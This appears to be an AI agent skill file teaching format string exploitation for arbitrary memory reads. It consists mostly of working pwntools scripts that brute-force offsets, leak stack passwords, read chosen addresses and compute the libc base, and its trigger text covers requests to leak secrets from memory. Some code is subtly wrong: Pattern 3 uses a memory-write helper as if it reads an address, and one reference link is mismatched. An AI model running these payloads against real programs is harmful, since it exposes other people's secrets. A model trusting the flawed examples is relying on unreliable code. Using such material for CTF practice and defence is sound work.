---
name: format-string-arbitrary-read
description: Exploit format string vulnerabilities to perform arbitrary memory reads. Use this skill whenever the user mentions format string bugs, printf vulnerabilities, %s/%p format specifiers, leaking stack/heap/libc addresses, or needs to read arbitrary memory locations in binary exploitation. Trigger on any C code with vulnerable printf() calls, pwn challenges involving format strings, or requests to leak secrets/passwords from memory.
---

# Format String Arbitrary Read Exploitation

This skill covers exploiting format string vulnerabilities to read arbitrary memory locations, including stack variables, heap data, and libc addresses.

## When to Use This Skill

Use this skill when:
- You encounter a `printf(user_input)` or similar vulnerable format string sink
- You need to leak stack variables, heap addresses, or libc pointers
- You're working on binary exploitation challenges with format string bugs
- You need to discover the correct format string offset for exploitation
- You want to read arbitrary memory addresses in a vulnerable binary

## Core Concepts

### Why Format Strings Are Dangerous

When `printf()` receives user-controlled input as the format string, it interprets special sequences like:
- `%s` - reads a string from the stack
- `%p` - reads a pointer from the stack
- `%x` - reads a hex value from the stack
- `%n` - writes to memory (not covered here, but dangerous)

### The Offset

The offset (e.g., `%11$s`) specifies which stack position to read. Finding the correct offset is critical:
- Use brute-force scanning (0-50+) to find controllable positions
- Use `pwntools.FmtStr` for automated discovery
- The offset depends on the binary's stack layout

### Null Byte Truncation

**Critical**: Place the format string BEFORE the address in your payload. `printf()` stops at null bytes, so if you send the address first, it will never reach the format string.

```
# WRONG - address contains null bytes, printf stops early
payload = p64(address) + b"%11$s"

# CORRECT - format string first, then address
payload = b"%11$s" + p64(address)
```

## Exploitation Workflow

### Step 1: Identify the Vulnerability

Look for patterns like:
```c
printf(user_input);           // Direct vulnerability
printf(buffer);               // If buffer is user-controlled
sprintf(dest, user_input);    // Also vulnerable
```

### Step 2: Find the Offset

**Manual brute-force:**
```python
from pwn import *

for i in range(100):
    p = process('./vulnerable')
    payload = f"%{i}$s".encode()
    p.sendline(payload)
    output = p.clean()
    if b"AAAA" in output:  # or any controlled pattern
        print(f"Found offset: {i}")
        break
```

**Automated with FmtStr:**
```python
from pwn import *

context.binary = ELF('./vulnerable', checksec=False)
io = process()

def exec_fmt(payload):
    io.sendline(payload)
    return io.recvuntil(b'\n', drop=False)

fmt = FmtStr(exec_fmt=exec_fmt)
offset = fmt.offset
log.success(f"Discovered offset: {offset}")
```

### Step 3: Read Stack Variables

Local variables are on the stack. Use `%s` to leak strings:

```python
from pwn import *

p = process('./vulnerable')
# If password is at offset 10
payload = f"%10$s".encode()
p.sendline(payload)
print(p.clean())  # Shows the leaked password
```

### Step 4: Read Arbitrary Addresses

To read from a specific address:

```python
from pwn import *

p = process('./vulnerable')

# Target address to read from
target_addr = 0x00400000  # or calculated address

# Format string first, then the address
payload = f"%11$s|||".encode()  # ||| as delimiter
payload += p64(target_addr)

p.sendline(payload)
print(p.clean())
```

### Step 5: Leak libc (PIE binaries)

For modern binaries with PIE/ASLR:

```python
from pwn import *

elf = context.binary = ELF('./vulnerable', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process()

# Leak libc pointer from stack (find offset first)
io.sendline(b"%25$p")
io.recvline()
leak = int(io.recvline().strip(), 16)

# Calculate libc base
libc.address = leak - libc.symbols['__libc_start_main'] - 243
log.info(f"libc @ {hex(libc.address)}")

# Now you can read from any libc address
secret = libc.address + 0x1f7bc
payload = f"%14$s".encode() + p64(secret)
io.sendline(payload)
print(io.recvuntil(b"\n"))
```

## Common Patterns

### Pattern 1: Simple Stack Leak

```python
from pwn import *

p = process('./vuln')
for i in range(100):
    payload = f"%{i}$s\na".encode()
    p.sendline(payload)
    output = p.clean()
    if b"secret" in output:  # Look for your target
        print(f"Found at offset {i}")
        break
```

### Pattern 2: Heap Leak + Offset Calculation

```python
from pwn import *

p = process('./vuln')

# First, leak a heap address
p.sendline(b"%25$p")
heap_leak = int(p.recvline().strip(), 16)

# Calculate target address relative to heap
target_addr = heap_leak + 0x1f7bc  # Adjust offset

# Read from calculated address
payload = f"%14$s".encode() + p64(target_addr)
p.sendline(payload)
print(p.clean())
```

### Pattern 3: Using fmtstr_payload (pwntools)

```python
from pwn import *

context.binary = ELF('./vuln', checksec=False)
io = process()

# Auto-discover offset
def exec_fmt(payload):
    io.sendline(payload)
    return io.recvuntil(b'\n', drop=False)

fmt = FmtStr(exec_fmt=exec_fmt)

# Build payload to read address
read_addr = 0x400000
payload = fmtstr_payload(fmt.offset, {read_addr: b"A" * 8})
io.sendline(payload)
print(io.clean())
```

## Compilation Tips

Compile vulnerable binaries with:
```bash
clang -o vuln vuln.c -Wno-format-security -no-pie
```

- `-Wno-format-security`: Suppresses format string warnings
- `-no-pie`: Disables PIE for easier exploitation (for learning)

For realistic exploitation, test with PIE enabled:
```bash
clang -o vuln vuln.c -Wno-format-security
```

## Debugging Tips

1. **Offset not working?** Try different ranges (0-50, 0-100, 0-200)
2. **Garbage output?** The offset might be reading uninitialized memory
3. **Null byte issues?** Always put format string before the address
4. **PIE/ASLR randomizing?** Leak libc first, then calculate addresses
5. **Using GDB?** Set breakpoint at `printf` and inspect the stack

## Security Notes

- Format string vulnerabilities are CWE-134
- Always validate format strings before passing to printf
- Use `printf("%s", user_input)` instead of `printf(user_input)`
- Modern compilers warn about this with `-Wformat-security`

## References

- [NVISO - Format string exploitation](https://blog.nviso.eu/2024/05/23/format-string-exploitation-a-hands-on-exploration-for-linux/)
- [pwntools FmtStr documentation](https://docs.pwntools.com/en/stable/tubes.html#pwntools.tubes.remote.remote.RemoteProcess)
- [HackTricks Format Strings](https://book.hacktricks.xyz/pentesting/remote-code-execution/rce-format-string-vulnerabilities)
